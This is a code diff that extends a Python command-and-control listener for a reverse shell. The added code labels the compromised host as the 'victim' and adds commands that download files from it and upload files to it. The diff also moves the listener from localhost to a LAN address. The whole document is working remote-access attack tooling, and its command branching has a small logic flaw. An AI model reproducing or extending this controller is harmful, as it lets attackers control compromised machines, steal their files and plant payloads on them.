@@ -1,4 +1,4 @@
-import socket
+import socket,os
 
 
 class Listener:
@@ -13,6 +13,7 @@ class Listener:
         except KeyboardInterrupt:
             exit("\nEXIT")
         print("[+] New connection from " + str(address))
+        self.victim = self.r_recv()
 
     def r_send(self, msg):
         msg = msg.encode()
@@ -24,17 +25,54 @@ class Listener:
             data += self.connection.recv(1024).decode()
         return data[:-4]
 
+    def download(self, filename):
+        f = open(filename,"wb")
+        while(True):
+            packet = self.connection.recv(1024)
+            if "[-] File not found".encode() in packet:
+                print("[-] File not found")
+                os.remove(filename)
+                break
+            elif packet.endswith("done".encode()):
+                f.write(packet[:-4])
+                f.close()
+                print("[+] Download completed")
+                break
+            f.write(packet)
+
+    def upload(self,filename):
+        if os.path.exists(filename):
+            f = open(filename,'rb')
+            packet = f.read(1024)
+            while(len(packet)>0):
+                self.connection.send(packet)
+                packet = f.read(1024)
+            self.connection.send("done".encode())
+        else:
+            self.connection.send("[-] File not found".encode())
+            print("[-] File not found")
+
     def run(self):
         while(True):
             try:
-                cmd = str(input(">> "))
+                cmd = str(input("[" + self.victim + "]>> "))
                 self.r_send(cmd)
-                result = self.r_recv()
-                print(result)
+                cmd = cmd.split(' ')
+                if cmd[0] == "download":
+                    self.download(cmd[1])
+                if cmd[0] == "upload":
+                    self.upload(cmd[1])
+                else:
+                    result = self.r_recv()
+                    print(result)
+
+                
+                
+
             except KeyboardInterrupt:
                 self.r_send("terminate")
                 self.connection.close()
                 exit("\nEXIT")
 
-listener = Listener("127.0.0.1",2000)
+listener = Listener("192.168.1.99",2000)
 listener.run()
